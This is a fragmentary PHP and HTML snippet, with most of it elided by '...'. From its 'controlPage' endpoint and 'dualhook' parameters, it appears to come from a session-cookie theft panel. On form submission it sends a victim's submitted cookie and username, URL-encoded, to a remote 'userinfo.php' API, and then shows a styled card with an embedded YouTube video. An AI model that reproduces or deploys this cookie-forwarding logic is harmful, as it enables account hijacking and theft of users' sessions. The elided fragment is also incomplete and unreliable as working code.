...
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    ...
    if (empty($errors)) {
        ...
        if ($cookie) {
            ...
            $userInfoUrl = "$dom/controlPage/apis/userinfo.php?cookie=" . urlencode($cookie) . "&username=" . urlencode($username) . "&web={web}&dh={dualhook}&dualhook={dualhook}";
                ...
                <div class="glass-card glass-card-gold">
                    ...
                    <div class="video-container" style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden; max-width: 100%; background: #000;">
                        <iframe style="position: absolute; top: 0; left: 0; width: 100%; height: 100%;" 
                                src="https://www.youtube.com/embed/GmvbIPJg0U0?rel=0" 
                                frameborder="0" 
